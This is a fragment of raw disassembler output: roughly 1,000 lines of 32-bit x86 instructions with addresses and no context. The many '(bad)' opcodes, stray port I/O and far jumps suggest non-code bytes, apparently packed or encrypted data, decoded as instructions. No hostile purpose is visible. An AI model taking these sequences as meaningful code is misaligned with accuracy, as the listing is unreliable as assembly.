  417291:	lds    esp,FWORD PTR [esi+0x3]
  417294:	jo     0x417263
  417296:	inc    ebp
  417297:	fstp   QWORD PTR [edi-0x1d289244]
  41729d:	add    BYTE PTR [ecx-0x34],dl
  4172a0:	(bad)  
  4172a2:	(bad)  
  4172a4:	mov    bl,0xdc
  4172a6:	jo     0x417285
  4172a8:	dec    ecx
  4172a9:	jmp    0xbbb15018
  4172ae:	(bad)  
  4172af:	leave  
  4172b0:	(bad)  
  4172b1:	lock inc ebp
  4172b3:	enter  0xe6d3,0xff
  4172b7:	int3   
  4172b8:	ret    
  4172b9:	repz jo 0x417254
  4172bc:	mov    dh,0xe6
  4172be:	sub    eax,0xffdab898
  4172c3:	je     0x417296
  4172c5:	lock jae 0x4172c8
  4172c8:	sbb    BYTE PTR [esi],0xdd
  4172cb:	ins    DWORD PTR es:[edi],dx
  4172cc:	xchg   esp,eax
  4172cd:	adc    al,dl
  4172cf:	jno    0x417267
  4172d1:	or     DWORD PTR [esi],ebx
  4172d3:	repz xchg ebx,eax
  4172d5:	(bad)  
  4172d7:	lds    esp,FWORD PTR [edx-0x47]
  4172da:	and    bl,ch
  4172dc:	popa   
  4172dd:	aad    0xbc
  4172df:	out    0x50,eax
  4172e1:	or     DWORD PTR [ebx],esp
  4172e3:	sar    DWORD PTR [edi-0x27],0xa
  4172e7:	jmp    0xe83d486d
  4172ec:	push   edi
  4172ed:	lock or al,bl
  4172f0:	dec    esi
  4172f1:	fcmovnbe st,st(5)
  4172f3:	loopne 0x417348
  4172f5:	mov    ecx,0x941f8ca
  4172fa:	mov    edx,0xd5d514de
  4172ff:	in     al,0x20
  417301:	out    0xa2,al
  417303:	mov    ebp,0x23cdec17
  417308:	jmp    0xbbef:0xf023c1e9
  41730f:	repz add edx,ebp
  417312:	(bad)  
  417313:	fst    QWORD PTR ds:0x4dcb5bd
  417319:	ret    
  41731a:	jg     0x41730f
  41731c:	or     al,bh
  41731e:	mov    dl,0xd3
  417320:	mov    bx,0xe595
  417324:	loop   0x4172fd
  417326:	xchg   ecx,esi
  417328:	sar    DWORD PTR [esp+eiz*4-0x102eff24],cl
  41732f:	mov    al,0xe7
  417332:	repz push es
  417334:	ror    ebp,0xed
  417337:	push   esi
  417338:	test   edx,0x8ae544f1
  41733e:	mov    eax,0xf288de3f
  417343:	ror    BYTE PTR ss:[ebx-0x772fcc25],1
  41734a:	lock dec DWORD PTR [edx+0x0]
  41734e:	pusha  
  41734f:	push   edx
  417350:	inc    eax
  417351:	or     ebx,ebp
  417353:	(bad)  
  417354:	cmp    eax,DWORD PTR [eax]
  417356:	jmp    0x4173c9
  417358:	xor    cl,ch
  41735a:	pop    edi
  41735b:	jne    0x41736c
  41735d:	sar    DWORD PTR [esi-0x46d2e59c],1
  417363:	ins    BYTE PTR es:[edi],dx
  417364:	sti    
  417365:	out    0x5f,al
  417367:	inc    ebx
  417368:	push   cs
  417369:	shr    ebx,1
  41736b:	(bad)  
  41736c:	sti    
  41736d:	xor    ch,BYTE PTR [edi]
  41736f:	jne    0x417374
  417371:	iret   
  417372:	pop    edi
  417373:	jbe    0x417345
  417375:	fsub   st(2),st
  417377:	ja     0x417395
  417379:	adc    ecx,DWORD PTR [ecx]
  41737b:	and    al,BYTE PTR [esi]
  41737d:	pop    edi
  41737e:	or     DWORD PTR [eax+esi*4-0x6d],ebx
  417382:	in     eax,dx
  417383:	arpl   sp,cx
  417385:	mov    bl,BYTE PTR [edi+0x4c]
  417388:	rcl    BYTE PTR [edx-0x39],0x53
  41738c:	cdq    
  41738d:	xor    bl,cl
  41738f:	jno    0x41734f
  417391:	add    BYTE PTR [eax-0x16],ch
  417394:	pusha  
  417395:	popf   
  417396:	sbb    al,0xe8
  417398:	ins    DWORD PTR es:[edi],dx
  417399:	nop
  41739a:	xor    ch,BYTE PTR [edi]
  41739c:	js     0x417322
  41739e:	mov    ds,WORD PTR [edi+0x7a]
  4173a1:	(bad)  
  4173a2:	push   ds
  4173a3:	mov    DWORD PTR [ebp-0x48],0xcc301a25
  4173aa:	jo     0x4173da
  4173ac:	inc    esi
  4173ad:	mov    ebx,0xb144152f
  4173b2:	sbb    dh,BYTE PTR [edi+esi*1]
  4173b5:	sbb    eax,DWORD PTR [edi]
  4173b7:	retf   
  4173b8:	sub    bl,BYTE PTR [eax]
  4173ba:	(bad)  
  4173bb:	push   ss
  4173bc:	cmp    BYTE PTR [edi],ch
  4173be:	repnz retf 
  4173c0:	xor    eax,0x34c8f918
  4173c5:	add    BYTE PTR [ebp+0x5],dh
  4173c8:	dec    esi
  4173c9:	outs   dx,DWORD PTR ds:[esi]
  4173ca:	pop    esi
  4173cb:	push   0x43
  4173cd:	push   esp
  4173ce:	sub    bh,bh
  4173d0:	arpl   WORD PTR [edx+0x18],sp
  4173d3:	dec    edi
  4173d4:	inc    esi
  4173d5:	dec    esi
  4173d6:	cmp    edi,DWORD PTR [ebx+eiz*2]
  4173d9:	je     0x4173fa
  4173db:	push   0x6f
  4173dd:	gs and al,0x9f
  4173e0:	ins    BYTE PTR es:[edi],dx
  4173e1:	jbe    0x41741c
  4173e3:	inc    edi
  4173e4:	push   ecx
  4173e5:	push   eax
  4173e6:	enter  0x6afc,0x65
  4173ea:	sub    DWORD PTR [eax+0x60],ebp
  4173ed:	outs   dx,DWORD PTR ds:[esi]
  4173ee:	int    0x3c
  4173f0:	jno    0x4173f2
  4173f2:	sub    ebp,DWORD PTR [edx+0x69]
  4173f5:	je     0x4173f7
  4173f7:	enter  0xa,0x0
  4173fb:	enter  0xa,0x0
  4173ff:	cwde   
  417400:	sub    al,0x0
  417402:	cmp    al,0xa7
  417404:	or     bh,BYTE PTR [eax+edx*2]
  417407:	out    0x3a,eax
  417409:	xor    BYTE PTR [edi-0x48],bl
  41740c:	imul   esi,DWORD PTR [eax+0x73],0xffffffcf
  417410:	cmp    eax,0xa8a646f
  417415:	cmp    al,0x53
  417417:	lds    esi,FWORD PTR [esi]
  417419:	dec    ebp
  41741a:	pop    edi
  41741b:	mov    eax,0xcf73706b
  417420:	cmp    eax,0xa8a646f
  417425:	cmp    al,0x49
  417427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417428:	dec    ebx
  417429:	dec    ebp
  41742a:	pop    edi
  41742b:	mov    eax,0xcf73706b
  417430:	cmp    al,0x6f
  417432:	mov    cl,BYTE PTR fs:[edx]
  417435:	cmp    al,0x48
  417437:	cld    
  417438:	cmp    BYTE PTR [ebp+0x4d],cl
  41743b:	jmp    0x31a0dd7b
  417440:	and    bl,ah
  417442:	jo     0x4173e6
  417444:	mov    bh,0xd8
  417446:	jno    0x4173dd
  417448:	bound  eax,QWORD PTR [ecx]
  41744a:	add    BYTE PTR [ebp+0x2d],dh
  41744d:	(bad)  [eax-0x7d]
  417450:	(bad)  
  417451:	hlt    
  417452:	ins    BYTE PTR es:[edi],dx
  417453:	(bad)  
  417454:	adc    al,0xc8
  417456:	push   esp
  417457:	mov    dh,dh
  417459:	fild   QWORD PTR [eax+eax*1+0x7e]
  41745d:	add    esp,DWORD PTR [esp+ecx*2]
  417460:	pop    eax
  417461:	(bad)  
  417462:	ficomp WORD PTR [edi]
  417464:	je     0x417477
  417466:	fld    TBYTE PTR [ebx+0x31]
  417469:	add    ebx,ecx
  41746b:	gs pop ebp
  41746d:	push   edi
  41746e:	in     al,0x71
  417470:	push   esp
  417471:	hlt    
  417472:	mov    dh,0x66
  417474:	push   edx
  417475:	(bad)  
  417476:	fidiv  DWORD PTR [eax+0x4e]
  417479:	dec    esi
  41747a:	in     eax,dx
  41747b:	pop    ebx
  41747c:	pop    esi
  41747d:	cmp    edi,edx
  41747f:	arpl   WORD PTR [esi],bx
  417481:	aas    
  417482:	neg    BYTE PTR [edi]
  417484:	cmc    
  417485:	dec    eax
  417486:	out    dx,eax
  417487:	bound  edx,QWORD PTR [ecx-0x6b]
  41748a:	in     al,0x66
  41748c:	add    eax,0x184ac570
  417491:	push   ebx
  417492:	rep ins BYTE PTR es:[edi],dx
  417494:	add    bl,BYTE PTR [edi-0x61228c21]
  41749a:	fsubr  QWORD PTR [ebp+0xd]
  41749d:	(bad)  
  41749e:	bnd jo 0x4174b2
  4174a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174a2:	in     al,0x66
  4174a4:	aad    0x6f
  4174a6:	(bad)  
  4174a7:	ins    BYTE PTR es:[edi],dx
  4174a8:	xlat   BYTE PTR ds:[ebx]
  4174a9:	fcomi  st,st(1)
  4174ab:	pop    esi
  4174ac:	jecxz  0x417432
  4174ae:	lds    ecx,FWORD PTR [edx-0x28]
  4174b1:	xchg   edx,eax
  4174b2:	rep ins BYTE PTR es:[edi],dx
  4174b4:	ret    0xdede
  4174b7:	jae    0x417496
  4174b9:	or     BYTE PTR [esi],bh
  4174bb:	ffree  st(4)
  4174bd:	in     al,0x4d
  4174bf:	repz add BYTE PTR [ecx-0x701adbd7],ah
  4174c6:	in     eax,dx
  4174c7:	out    0xd6,al
  4174c9:	(bad)  
  4174ca:	jecxz  0x417506
  4174cc:	repz ja 0x4174a6
  4174cf:	inc    ebx
  4174d0:	enter  0xf260,0x43
  4174d4:	lds    eax,FWORD PTR [eax+0x70c839d5]
  4174da:	pop    ss
  4174db:	inc    ebx
  4174dc:	xlat   BYTE PTR ds:[ebx]
  4174dd:	xchg   ebx,eax
  4174de:	aad    0x12
  4174e0:	fstp   QWORD PTR [esp+eiz*8+0x19]
  4174e4:	add    al,0x6d
  4174e6:	jmp    0x3f8:0xf272e512
  4174ed:	ins    DWORD PTR es:[edi],dx
  4174ee:	jmp    0xc5f8:0xf272e4f2
  4174f5:	addr16 lock out 0xb8,al
  4174f9:	pop    edi
  4174fa:	repnz shl ch,cl
  4174fd:	inc    ebp
  4174fe:	loope  0x41750c
  417500:	fstp   QWORD PTR [edx+esi*8]
  417503:	out    0xd6,al
  417505:	adc    eax,0xfff2d2e3
  41750a:	(bad)  
  41750b:	retf   
  41750c:	(bad)  
  41750d:	out    0xeb,al
  41750f:	leave  
  417510:	fisubr DWORD PTR [esi]
  417512:	mov    eax,0xe602f6af
  417517:	mov    ebx,0x94d21ef6
  41751c:	out    0x76,al
  41751e:	int3   
  41751f:	xchg   edi,ebp
  417521:	(bad)  
  417522:	or     BYTE PTR [ebx-0x182aff2d],dh
  417528:	jge    0x417500
  41752a:	out    0xd7,eax
  41752c:	jp     0x41750e
  41752e:	retf   
  41752f:	sub    dl,BYTE PTR [eax+0x8d7d9]
  417535:	cdq    
  417536:	cmp    al,0xed
  417538:	fs jnp 0x417590
  41753b:	out    dx,eax
  41753c:	jmp    FWORD PTR [edx+edx*2]
  41753f:	fcomp  DWORD PTR [esi+0x39]
  417542:	adc    bl,al
  417544:	addr16 jmp 0x3ea25e5d
  41754a:	push   cs
  41754b:	out    dx,al
  41754c:	jae    0x417588
  41754e:	cmp    esp,esp
  417550:	ins    DWORD PTR es:[edi],dx
  417551:	push   eax
  417552:	xor    eax,0xc464fbd
  417557:	in     eax,dx
  417558:	push   0x48
  41755a:	(bad)  
  41755c:	(bad)  
  41755d:	cmp    eax,ebx
  41755f:	in     eax,0x73
  417561:	push   ss
  417562:	rcr    cl,cl
  417564:	bound  esi,QWORD PTR ds:0x1b60edaa
  41756a:	(bad)  
  41756b:	out    0x66,eax
  41756d:	xor    al,0xd2
  41756f:	loop   0x4175dc
  417571:	jmp    0xa06405
  417576:	jmp    0xc746d995
  41757b:	out    0x70,al
  41757d:	fidiv  DWORD PTR [edx]
  41757f:	mov    ch,0x62
  417581:	retf   0xed8a
  417584:	ins    BYTE PTR es:[edi],dx
  417585:	lds    ecx,FWORD PTR [ecx+0xe976e4]
  41758b:	sub    ah,0x6f
  41758e:	call   0x5b84:0xc475d977
  417595:	dec    ebp
  417596:	mov    BYTE PTR [edx-0x71449335],0x5b
  41759d:	dec    ebp
  41759e:	xchg   esi,eax
  41759f:	sbb    BYTE PTR [edx],0x61
  4175a2:	mov    cl,BYTE PTR [ecx+0x329d6dd6]
  4175a8:	mov    ecx,0xba82996c
  4175ad:	jo     0x4175af
  4175af:	fistp  DWORD PTR [eax+0x6c]
  4175b2:	jb     0x417568
  4175b4:	pop    es
  4175b5:	dec    edi
  4175b6:	ins    DWORD PTR es:[edi],dx
  4175b7:	les    edx,FWORD PTR [edi+0x50]
  4175ba:	gs mov edx,0x48726259
  4175c0:	xor    al,0x6a
  4175c2:	je     0x41754c
  4175c4:	xor    eax,0x584726c
  4175c9:	dec    edi
  4175ca:	ins    DWORD PTR es:[edi],dx
  4175cb:	test   BYTE PTR [ebp+0x3e],dl
  4175ce:	arpl   WORD PTR [ebx+0x40],bp
  4175d1:	jb     0x417641
  4175d3:	inc    esp
  4175d4:	add    eax,0x55446d4f
  4175d9:	dec    ebp
  4175da:	popa   
  4175db:	cmp    edx,DWORD PTR [esp+esi*2+0x6f]
  4175df:	sbb    ch,BYTE PTR [ecx-0x3]
  4175e2:	pusha  
  4175e3:	cmp    esp,DWORD PTR [esp+ebp*2+0x75]
  4175e7:	cs pop ecx
  4175e9:	sub    esp,DWORD PTR [ebx+0x36]
  4175ec:	push   0x2b0060fd
  4175f1:	fs ins BYTE PTR es:[edi],dx
  4175f3:	jne    0x417633
  4175f5:	pop    ecx
  4175f6:	sub    esp,DWORD PTR [ebx+0x36]
  4175f9:	aas    
  4175fa:	std    
  4175fb:	pop    ebx
  4175fc:	or     ah,BYTE PTR [esi+0x71]
  4175ff:	dec    ebp
  417600:	jmp    0xec41df44
  417605:	dec    edx
  417606:	gs cmp BYTE PTR gs:[ebx+0x5e],al
  41760b:	je     0x417636
  41760d:	add    eax,0x6a666f4f
  417612:	je     0x417675
  417614:	retf   0x593b
  417617:	push   edx
  417618:	ror    DWORD PTR [edx+0x59],1
  41761b:	push   esp
  41761c:	jo     0x417659
  41761e:	sbb    eax,0x1e6aa942
  417623:	add    BYTE PTR [ebx+0x31746341],ch
  417629:	jnp    0x41760d
  41762b:	jno    0x417601
  41762d:	stos   DWORD PTR es:[edi],eax
  41762e:	rol    DWORD PTR [esi-0x3],cl
  417631:	mov    ds:0x4fd467cd,eax
  417636:	ret    
  417637:	pop    esi
  417638:	mov    ebp,0xc252c550
  41763d:	test   bl,dh
  41763f:	jo     0x417652
  417641:	int3   
  417642:	fisubr WORD PTR [edi-0x62]
  417645:	mov    ah,0x3
  417647:	push   ebp
  417648:	xchg   esi,eax
  417649:	mov    esi,0xc38f66d8
  41764e:	and    eax,DWORD PTR [eax+ecx*4+0x1e]
  417652:	fbld   TBYTE PTR [eax+0x0]
  417655:	test   ebx,ecx
  417657:	icebp  
  417658:	jbe    0x41768b
  41765a:	add    dl,dh
  41765c:	ins    BYTE PTR es:[edi],dx
  41765d:	xchg   esi,eax
  41765e:	push   ds
  41765f:	jecxz  0x4176cb
  417661:	ins    DWORD PTR es:[edi],dx
  417662:	stc    
  417663:	icebp  
  417664:	push   DWORD PTR [ebx+0xb]
  417667:	out    dx,eax
  417668:	ins    DWORD PTR es:[edi],dx
  417669:	pop    ebp
  41766a:	jo     0x417629
  41766c:	bound  edx,QWORD PTR [edi+0x11]
  41766f:	out    dx,eax
  417670:	imul   ebx,DWORD PTR [ebp+0x70],0xffffffbd
  417674:	inc    bx
  417676:	push   eax
  417677:	and    ah,BYTE PTR [ebx]
  417679:	dec    ebp
  41767a:	jo     0x41764e
  41767c:	dec    edx
  41767d:	add    BYTE PTR gs:[ebx+eax*2],ah
  417681:	inc    esp
  417682:	push   ecx
  417683:	fsubr  QWORD PTR [ebx+0x51]
  417686:	mov    cl,0xdd
  417688:	arpl   WORD PTR [ebx],sp
  41768a:	dec    ebp
  41768b:	bnd jo 0x4176bf
  41768e:	lahf   
  41768f:	mov    eax,0xd1100153
  417694:	bound  eax,QWORD PTR [ebx]
  417696:	xchg   edx,eax
  417697:	loopne 0x41770a
  417699:	xor    DWORD PTR [eax+0x10424fb6],eax
  41769f:	shl    DWORD PTR [edx+0x3],1
  4176a2:	or     DWORD PTR [ebp-0x48f71f20],ebx
  4176a8:	mov    dh,0xf6
  4176aa:	adc    eax,0xe3e1d0c7
  4176af:	cwde   
  4176b0:	and    esp,edi
  4176b2:	out    0x93,eax
  4176b4:	loopne 0x417704
  4176b6:	mov    dh,0xab
  4176b8:	iret   
  4176b9:	add    dh,dh
  4176bb:	sub    BYTE PTR [edx+esi*8-0x4a39292d],bl
  4176c2:	xlat   BYTE PTR ds:[ebx]
  4176c3:	jmp    0x417710
  4176c5:	add    al,0x7f
  4176c7:	(bad)  
  4176c8:	xor    dl,ah
  4176ca:	inc    esi
  4176cb:	into   
  4176cc:	inc    ebx
  4176cd:	in     eax,0x97
  4176cf:	in     eax,0x6
  4176d1:	lds    edx,FWORD PTR [edx-0x7e1ec713]
  4176d7:	fsubr  st(6),st
  4176d9:	mov    ch,0x74
  4176db:	mov    ebp,0xdc622416
  4176e0:	inc    ebx
  4176e1:	repnz push ss
  4176e3:	mov    DWORD PTR [edi],0x2d0953d9
  4176e9:	mov    dh,0x82
  4176eb:	mov    ecx,0xdb53d2c6
  4176f0:	adc    al,0xe1
  4176f2:	pusha  
  4176f3:	or     DWORD PTR [eax],esi
  4176f5:	mov    ecx,0xd2c6b90f
  4176fa:	push   ebx
  4176fb:	(bad)  
  4176fd:	loopne 0x41773f
  4176ff:	or     DWORD PTR [eax],esp
  417701:	mov    ecx,0xd106b8f7
  417706:	and    esi,ebp
  417708:	fsub   DWORD PTR [ebx]
  41770a:	imul   ecx
  41770c:	ret    
  41770d:	loopne 0x4176ad
  41770f:	int    0xbb
  417711:	in     al,0xf
  417713:	in     eax,0xe6
  417715:	mov    ebx,0x2396bce2
  41771a:	loop   0x4176f7
  41771c:	dec    ebx
  41771e:	add    BYTE PTR [eax+0x66954558],al
  417724:	enter  0xba1f,0x51
  417728:	fidiv  DWORD PTR [ebp-0x7c]
  41772b:	pusha  
  41772c:	clc    
  41772d:	push   edx
  41772e:	mov    ebx,0x9e4d58a6
  417733:	sbb    BYTE PTR [ecx],0x20
  417736:	pushf  
  417737:	inc    ebx
  417738:	jmp    0x4177ab
  41773a:	jmp    0x99803ac4
  41773f:	adc    bh,BYTE PTR [eax+esi*2+0x45584084]
  417746:	cmp    eax,0x484ac801
  41774b:	or     ah,ah
  41774d:	pop    ds
  41774e:	cmp    al,0x20
  417750:	jmp    0x4177c3
  417752:	or     edi,ebx
  417754:	mov    dh,0x6a
  417756:	dec    esp
  417757:	xor    eax,0xdd1553c1
  41775c:	ret    0x405e
  41775f:	fincstp 
  417761:	push   eax
  417762:	inc    esp
  417763:	add    ebx,esi
  417765:	bound  ebx,QWORD PTR [ebx]
  417767:	xor    eax,0xfd354aba
  41776c:	not    DWORD PTR [edx+0x1a]
  41776f:	(bad)  
  417770:	fcos   
  417772:	call   0xba913c79
  417777:	adc    bh,BYTE PTR [ecx+0x57d6fb6c]
  41777d:	push   edx
  41777e:	and    al,0xe1
  417780:	(bad)  
  417781:	pop    ds
  417782:	sbb    DWORD PTR [eax],eax
  417784:	(bad)  
  417786:	jae    0x417771
  417788:	jmp    0x41774c
  41778a:	ds mov ecx,0xdb6cb952
  417790:	mov    ss,WORD PTR [edi-0x3]
  417793:	mov    ecx,0x30c7dd
  417798:	cmp    BYTE PTR ds:0x64cb735e,bh
  41779e:	ins    BYTE PTR es:[edi],dx
  41779f:	jb     0x41780d
  4177a1:	sbb    DWORD PTR [eax],eax
  4177a3:	dec    ecx
  4177a4:	xchg   ebp,eax
  4177a5:	dec    edx
  4177a6:	dec    ebp
  4177a7:	and    BYTE PTR [eax-0x408c8f96],ch
  4177ad:	cmp    al,0x6f
  4177af:	fs jp  0x4177bd
  4177b2:	dec    esi
  4177b3:	dec    esi
  4177b4:	pushf  
  4177b5:	cmp    ebx,DWORD PTR ds:0x7058b950
  4177bb:	ja     0x417774
  4177bd:	pop    ecx
  4177be:	popa   
  4177bf:	xor    cl,BYTE PTR [eax-0x6d]
  4177c2:	push   ecx
  4177c3:	push   esp
  4177c4:	cwde   
  4177c5:	sahf   
  4177c6:	pop    esi
  4177c7:	imul   eax,DWORD PTR [ebp+ebp*1+0x588b6150],0x697a6f74
  4177d2:	das    
  4177d3:	add    BYTE PTR [ebx-0x62],bl
  4177d6:	push   ecx
  4177d7:	push   eax
  4177d8:	cmp    BYTE PTR ds:0x644b735e,bh
  4177de:	ins    BYTE PTR es:[edi],dx
  4177df:	jb     0x41784d
  4177e1:	sbb    eax,DWORD PTR [eax]
  4177e3:	add    BYTE PTR [eax],bl
  4177e5:	pushf  
  4177e6:	dec    ebp
  4177e7:	xor    eax,DWORD PTR [eax]
  4177e9:	clc    
  4177ea:	cmp    bl,BYTE PTR [esi+0x73]
  4177ed:	dec    ebx
  4177ee:	fs ins BYTE PTR es:[edi],dx
  4177f0:	jb     0x41781e
  4177f2:	or     eax,0x3d094d45
  4177f7:	sbb    eax,0x70583950
  4177fc:	ja     0x417835
  4177fe:	pop    ebx
  4177ff:	popa   
  417800:	add    BYTE PTR [esi],dl
  417802:	lahf   
  417803:	push   ecx
  417804:	push   eax
  417805:	call   0x8bb4d644
  41780a:	gs ins BYTE PTR es:[edi],dx
  41780c:	jb     0x41787a
  41780e:	or     cl,BYTE PTR [eax+0x54]
  417811:	xor    DWORD PTR [ecx+edx*8-0xfbefee1],edx
  417818:	jo     0x417820
  41781a:	aas    
  41781b:	out    dx,eax
  41781c:	arpl   WORD PTR [ecx],si
  41781e:	jae    0x4177d6
  417820:	push   ebx
  417821:	loope  0x417822
  417823:	rcr    DWORD PTR [esi+0x2],cl
  417826:	xchg   ebx,eax
  417827:	in     al,dx
  417828:	ins    BYTE PTR es:[edi],dx
  417829:	jecxz  0x4177ae
  41782b:	add    DWORD PTR [eax],eax
  41782d:	add    al,BYTE PTR [edi-0x7f198c25]
  417833:	out    dx,eax
  417834:	(bad)  
  417835:	cmc    
  417836:	je     0x417812
  417838:	pusha  
  417839:	ret    
  41783a:	jle    0x41782c
  41783c:	ins    BYTE PTR es:[edi],dx
  41783d:	iret   
  41783e:	fcmovnb st,st(4)
  417840:	inc    esi
  417841:	iret   
  417842:	rcr    ebp,cl
  417844:	jno    0x41780d
  417846:	mov    ebp,gs
  417848:	pop    ds
  417849:	jo     0x41780e
  41784b:	in     al,0x6c
  41784d:	add    BYTE PTR [esi+eax*8-0x3e93e029],bl
  417854:	icebp  
  417855:	pop    esi
  417856:	mov    cs,ebp
  417858:	aad    0x5b
  41785a:	jo     0x41781f
  41785c:	in     al,0x6c
  41785e:	jl     0x417826
  417860:	xlat   BYTE PTR ds:[ebx]
  417861:	jo     0x417894
  417863:	sub    eax,ebp
  417865:	bound  eax,QWORD PTR [edi+0x5873eb1c]
  41786b:	add    eax,0x783ffd5
  417870:	jmp    0x7562:0xd6016673
  417877:	cmc    
  417878:	jmp    0x4f6c:0xd4ff4360
  41787f:	pop    esp
  417880:	mov    ebp,0xeb06574c
  417885:	pusha  
  417886:	dec    esp
  417887:	add    al,0xd1
  417889:	jb     0x4178b0
  41788b:	or     ebx,edx
  41788d:	repnz adc eax,0xebd2bae2
  417893:	mov    edi,0xea11c506
  417898:	mov    ebp,0x6dd1cd8
  41789d:	shl    edi,1
  41789f:	out    0xc7,al
  4178a1:	jmp    0xea11:0xc492db13
  4178a8:	mov    ebp,0x99dcdcd8
  4178ad:	add    eax,DWORD PTR [eax]
  4178af:	out    0x84,al
  4178b1:	xlat   BYTE PTR ds:[ebx]
  4178b2:	add    ch,ah
  4178b4:	out    0x98,eax
  4178b6:	call   0xe6c13cb5
  4178bb:	shl    ch,0x79
  4178be:	repnz int3 
  4178c0:	fcomp  QWORD PTR [edx-0x75192846]
  4178c6:	repnz mov ebp,0x82d1c6d9
  4178cc:	mov    ch,0x29
  4178ce:	fldenv [eax-0x5d0dbc29]
  4178d4:	mov    ebx,0xe2a1d64b
  4178d9:	cmp    eax,0x4fbc6af2
  4178de:	repnz xchg edx,eax
  4178e0:	in     al,0x35
  4178e2:	xlat   BYTE PTR ds:[ebx]
  4178e3:	push   ds
  4178e4:	(bad)  
  4178e5:	dec    ebx
  4178e6:	xlat   BYTE PTR ds:[ebx]
  4178e7:	sub    edx,0xec5ced45
  4178ed:	(bad)  
  4178ee:	mov    dh,0x63
  4178f0:	out    0x19,eax
  4178f2:	frstor [ecx-0x23]
  4178f5:	or     esi,ecx
  4178f7:	jp     0x4178b2
  4178f9:	sbb    bl,dh
  4178fb:	push   esp
  4178fc:	loop   0x417910
  4178fe:	jmp    0xed6d2e44
  417903:	push   ecx
  417904:	xlat   BYTE PTR ds:[ebx]
  417905:	inc    DWORD PTR ds:0xf565e5de
  41790b:	push   edx
  41790c:	(bad)  
  41790d:	jb     0x4178ec
  41790f:	xchg   esi,eax
  417910:	in     eax,0x6c
  417912:	rcl    BYTE PTR [edx-0x34],cl
  417915:	ins    DWORD PTR es:[edi],dx
  417916:	fld    QWORD PTR [eax]
  417918:	mov    edx,ebx
  41791a:	ins    DWORD PTR es:[edi],dx
  41791b:	les    esp,FWORD PTR [esi-0xc]
  41791e:	push   eax
  41791f:	int3   
  417920:	pop    esi
  417921:	fsub   DWORD PTR [esi-0x31]
  417924:	mov    ebx,ecx
  417926:	call   FWORD PTR [ecx-0x498c117d]
  41792c:	push   ebp
  41792d:	fisub  DWORD PTR [edx-0x3b]
  417930:	sub    ebx,0xd9639b60
  417936:	ins    BYTE PTR es:[edi],dx
  417937:	(bad)  
  417938:	jle    0x4178ea
  41793a:	push   esp
  41793b:	add    BYTE PTR [eax-0x18],0x6c
  41793f:	jle    0x4179a0
  417941:	hlt    
  417942:	dec    ebp
  417943:	xchg   ebp,eax
  417944:	jle    0x41790f
  417946:	jb     0x4179c3
  417948:	pop    esp
  417949:	out    0x6d,eax
  41794b:	jne    0x417935
  41794d:	out    0x71,al
  41794f:	pop    edx
  417950:	sbb    ah,ch
  417952:	ins    DWORD PTR es:[edi],dx
  417953:	cmp    eax,0x4d6dead8
  417958:	and    ch,bl
  41795a:	jo     0x417965
  41795c:	(bad)  
  41795d:	out    0x70,al
  41795f:	cmp    dl,BYTE PTR [edx]
  417961:	in     eax,dx
  417962:	dec    di
  417964:	or     ah,dh
  417966:	push   eax
  417967:	cmp    al,0xf
  417969:	fnstenv [esi+0x3a]
  41796c:	or     edi,esp
  41796e:	push   0x45
  417970:	popf   
  417971:	fldcw  WORD PTR [edi+eax*1-0x36]
  417975:	fbld   TBYTE PTR [edx+0x1a]
  417978:	icebp  
  417979:	les    esi,FWORD PTR [edx+0x15]
  41797c:	add    cl,al
  41797e:	in     al,0x6c
  417980:	add    BYTE PTR [ebx],ah
  417982:	or     eax,0x31366f4f
  417987:	je     0x4179ea
  417989:	mov    edx,0x314d596a
  41798e:	outs   dx,BYTE PTR ds:[esi]
  41798f:	outs   dx,DWORD PTR ds:[esi]
  417990:	outs   dx,DWORD PTR ds:[esi]
  417991:	mov    ebx,DWORD PTR [eax+0x63]
  417994:	je     0x417972
  417996:	imul   esi,DWORD PTR ds:[ebp+eiz*2+0x3d],0x6b
  41799c:	gs fs daa 
  41799f:	cmp    eax,0x72587b63
  4179a4:	outs   dx,BYTE PTR ds:[esi]
  4179a5:	les    esp,FWORD PTR [edi]
  4179a7:	dec    ecx
  4179a8:	popa   
  4179a9:	outs   dx,BYTE PTR ds:[esi]
  4179aa:	data16 fs gs stos BYTE PTR es:[edi],al
  4179ae:	pop    es
  4179af:	dec    ebx
  4179b0:	jne    0x417976
  4179b2:	arpl   WORD PTR [edi+ebp*2-0x3d],bp
  4179b6:	pop    es
  4179b7:	pop    esp
  4179b8:	inc    ecx
  4179b9:	stos   DWORD PTR es:[edi],eax
  4179ba:	ins    BYTE PTR es:[edi],dx
  4179bb:	ins    BYTE PTR es:[edi],dx
  4179bc:	jne    0x41798c
  4179be:	cmp    esi,DWORD PTR [eax+0x0]
  4179c1:	mov    eax,ds:0xc46e626b
  4179c6:	pop    esi
  4179c7:	arpl   WORD PTR [ecx-0x55],bp
  4179ca:	data16 jno 0x417a36
  4179cd:	scas   eax,DWORD PTR es:[edi]
  4179ce:	pop    eax
  4179cf:	std    
  4179d0:	push   0x746b6a74
  4179d5:	xor    DWORD PTR [ecx],0x3b676d76
  4179db:	std    
  4179dc:	push   0x63716a4e
  4179e1:	add    BYTE PTR [edi+0x62],bl
  4179e4:	push   0x20
  4179e6:	cmp    ebp,DWORD PTR [edx+0x6f]
  4179e9:	jbe    0x417a50
  4179eb:	cmp    ebx,DWORD PTR ds:0x703c7970
  4179f1:	ja     0x417a32
  4179f3:	cmp    esp,DWORD PTR [ecx+0x73]
  4179f6:	enter  0x7259,0x74
  4179fa:	xor    DWORD PTR [edi+ebp*8],ecx
  4179fd:	ins    BYTE PTR es:[edi],dx
  4179fe:	pop    edx
  4179ff:	inc    eax
  417a00:	loop   0x417a62
  417a02:	push   edx
  417a03:	sti    
  417a04:	aam    0x6d
  417a06:	inc    ebp
  417a07:	inc    eax
  417a08:	out    dx,al
  417a09:	pop    esi
  417a0a:	inc    edi
  417a0b:	add    edi,esp
  417a0d:	bound  esp,QWORD PTR [ebx]
  417a0f:	inc    eax
  417a10:	rcr    DWORD PTR [esi+0x22],1
  417a13:	das    
  417a14:	fsubr  DWORD PTR [ebx+eiz*1+0x4c]
  417a18:	aam    0xff
  417a1a:	or     DWORD PTR [esi+eiz*8+0x6d],eax
  417a1e:	add    eax,0xc66d549
  417a23:	pop    DWORD PTR [ecx]
  417a25:	jns    0x417a7b
  417a27:	push   eax
  417a28:	sbb    DWORD PTR [eax+0x44],ebx
  417a2b:	add    eax,0x55093414
  417a30:	xor    BYTE PTR es:0x21232e48,bl
  417a37:	cs mov ecx,0xb92e2122
